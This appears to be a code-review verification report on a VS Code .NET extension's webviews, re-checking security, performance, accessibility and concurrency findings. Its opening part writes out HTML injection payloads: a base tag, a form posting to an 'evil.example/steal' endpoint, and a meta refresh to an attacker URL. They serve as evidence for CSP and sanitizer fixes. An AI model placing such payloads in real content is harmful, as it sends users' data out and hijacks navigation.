- `<base href="https://evil.example/">` takes effect: `document.baseURI` becomes `https://evil.example/`, so a relative `<img src="pixel.png">` loads `GET https://evil.example/pixel.png` and a relative markdown link points to `https://evil.example/docs/page.html`.
- Clicking the README's `<button>` in its `<form>` sends `POST https://evil.example/steal` (form data included) and navigates the webview document away. So form submission is no longer just suspected.
- New: `<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">` in the README navigates the whole webview document to the attacker's URL right away, with no click. markdown-to-jsx keeps the `<meta>`, React 19 hoists it into `<head>` (checked: it ends up next to the CSP meta), Chromium runs the refresh, and CSP has no directive against navigation. The reviewer's jsdom proof missed it because the hoisted tag is not in the rendered container.
- With `form-action 'none'; base-uri 'none'` added, Chromium blocks the base URI and the form post (CSP violations logged; the requests are not made), but the meta refresh still navigates. So the fix must also drop `meta` (and `base`, `form`) in markdown-to-jsx `overrides`, or turn off raw HTML. What VS Code's own webview wrapper does with a navigating inner frame was not tried; its sandbox allows forms and scripts. `'unsafe-eval'`: the dev bundles contain no `eval(`/`new Function`; confirmed.

**A3-8 CONFIRMED (risk); real Chromium is not faster than the jsdom figures suggest.** `TreeNode` is a plain function component (no `memo` anywhere in `TreeNode.tsx`/`SolutionTree.tsx`), the handlers in `SolutionTree.tsx:600-625` are recreated on each render, and `buildTreeNodes` copies every node on each `projects` change (`:144-151, 165`). Reviewer's tests re-run: 6,102 `Icon` renders for one ArrowDown or one `solutionData`, merge references not kept. Measured again with the real bundle in headless Chromium (synthetic 50 x 10 x 10 tree, 5,551 rows; time from the event to the next frame, median of 8): hovering a new row 606 ms, an `activeFileChanged` message 346 ms. The same tree with 1 project (112 rows): 27 ms and 15 ms, with an idle frame at about 15 ms. So the cost grows with the visible rows. It is a risk rather than a bug: 5,551 expanded rows is extreme, but a few hundred expanded rows already cost tens of ms per hover (machine-dependent; headless shell without GPU).

**A3-9 CONFIRMED by code (bug, a11y).** `grep -rn "role=\|aria-" src/webview/solution-view` returns nothing. Arrow keys call only `setFocusedNodeId` (`SolutionTree.tsx:372-380`), Space selects (`:413-416`), and there is no Shift/Ctrl+arrow handling. Key bindings act on `ctx?.nodeId ?? provider.focusedNodeId` (`nativeContextMenu.ts:25`), and the multi-select path needs `_selectedNodeIds.includes(nodeId)` (`SolutionWebviewProvider.ts:188`). So Delete after Ctrl+click A, B and Down to C acts on C alone, as written. Screen-reader output not tested (no NVDA/Orca here).

**A3-10 CONFIRMED by code (bug, a11y).** `publish-view/App.tsx:136, 145, 234-236` and `error-list/App.tsx:173` are `<a>` without `href` (not focusable by browser rules). The sort span at `:155` has `role="button"` and `aria-label` but no `tabIndex`/key handler. vscrui's `Checkbox` (`node_modules/vscrui/dist/checkbox.js`) spreads the remaining props onto the `<label>`, not the `<input>`, and labels only via `children`, so an `aria-label` passed by the app would not help either: the fix is to pass the text as `children`. The input is `opacity: 0`, not `display: none`, so Tab reaches it, with no name.

**A3-11 CONFIRMED in the webview (bug), host effect plausible; the window is narrower than it sounds.** `create()` checks only `busy`, which comes from the host (`TemplateWizardPanel.ts:41`, `post busy` before `await create(request)`), and the host listener is async with no guard, so a second `create` runs concurrently and passes the "not empty" check (`templateService.ts:201`, before `dotnet new` writes). Reviewer's test reproduced (3 requests). In real use the second request needs a second Enter/click before the `busy` round trip (normally a few ms, longer when the extension host is busy), so a double-click or a key repeat while the extension host is loaded, not every double Enter. Also, after the first one succeeds, `panel.dispose()` runs while the second still calls `post(...)` on the disposed webview.

**A3-12 CONFIRMED by mutation (risk).** Repeated in the second copy (and then reverted there): `src/core/idPeek.ts` with `globalThis.atob(...)`, imported and used from `webview/shared/nodeIdUtils.ts`, and `opaqueNodeIds.test.ts` passes (`Tests: 1 passed`). `if (process.platform === "darwin")` added to `isMacPlatform` in `webview/shared/dragCopyKey.ts`: `webviewBundle.test.ts` passes (`2 passed`), `tsc -p src/webview/tsconfig.json` passes, and webpack builds with exit 0, leaving `process.platform` in the bundle as is. In real Chromium, the mutated solution-view bundle throws `process is not defined` on a drag of a file onto a project and sends no `moveNodes`, while the unmutated bundle sends `moveNodes`. So the runtime failure is shown, not just inferred.

**A3-13 sanity check: holds.** `FrameworkSelector` is referenced only by its own folder and a props type; `handleFrameworkChange` is only returned; `isActiveFile = false` (`TreeNode.tsx:48`); `HtmlWebpackPlugin` emits the two `template.html` files that no provider loads; `setIncludePrerelease(prev => prev)` (`App.tsx:215, 226`); `parent.innerHTML = '📦'` (`PackageList.tsx:151`); the click timer lives in state and is cleared only on the next click or double-click (`TreeNode.tsx:40, 66-72, 104`), not on unmount.

### Changes to the reviewer's findings

- A3-7: severity **up** (risk → bug, security). Form submission is confirmed, and a README `<meta http-equiv="refresh">` navigates the webview without any click (not in the original report); the suggested CSP fix alone does not stop it, so `meta` must be dropped in the markdown renderer.
- A3-6: **partially confirmed**. The NuGet `error` message and the search `error` field are practically never sent by today's host, so "loading forever" does not happen in normal use (latent); "a failed feed looks like no results" is real but comes from the host swallowing feed errors (`packageBrowseService.ts:313-338`), so the fix belongs in the host. The Solution Explorer part stands.
- A3-3: the example should be a multi-word query (`json serializer`); the tag-only example does not hold for the real Jil package.
- A3-11: the double-submit window is the `busy` round trip, so in practice it needs a fast double input or a loaded extension host.
- A3-2: reproduced for Alt/Option characters in real Chromium. For Windows AltGr the handler's cancellation is shown, but the text insertion cannot be shown on Linux. Real Linux AltGr (`altKey` false) is not affected.
- A3-1, A3-4, A3-5, A3-8, A3-9, A3-10, A3-12: confirmed as written (A3-5 slightly worse: "Loading README..." and then the old package's text also show for a package without README).

Scratch files of this pass: `/tmp/verify-a3/src/test/unit/verify/` (jest) and `/tmp/verify-a3/browser/` (Playwright scripts: `solution.js`, `altgr-cdp.js`, `nuget-readme.js`, `nuget-meta.js`, `treeperf.js`, `mut.js`).
